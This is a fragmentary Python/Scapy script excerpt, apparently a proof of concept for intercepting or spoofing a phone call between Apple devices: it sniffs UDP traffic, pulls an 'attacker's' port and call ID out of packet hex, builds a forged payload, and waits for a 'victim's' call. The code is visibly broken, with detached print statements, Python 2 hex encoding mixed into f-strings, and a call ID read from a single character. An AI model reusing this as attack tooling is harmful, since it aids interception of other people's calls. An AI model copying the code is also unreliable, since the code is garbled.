...
print
f"------Got the attacker's iPhone port: {spoofedPktdport}"

print
"------Send response to obtain the call ID"
myLoad = f'{attackerPayload[:3]}1{attackerPayload[4:]}'
...
print
"------Waiting for the attacker's call ID package..."
myfilter = f"udp and src {macbook} and dst {iphone}"
pkt = sniff(iface="pflog0", filter=myfilter, count=1)
hexPkt = str(pkt[0]).encode("HEX")
attackerPayload = hexPkt[184]
print
f"------Got the attacker's call ID: {attackerPayload}"
...
print
"------Waiting for the victim's call..."
myfilter = f"udp and src {prismacbook} and dst {macbook}"
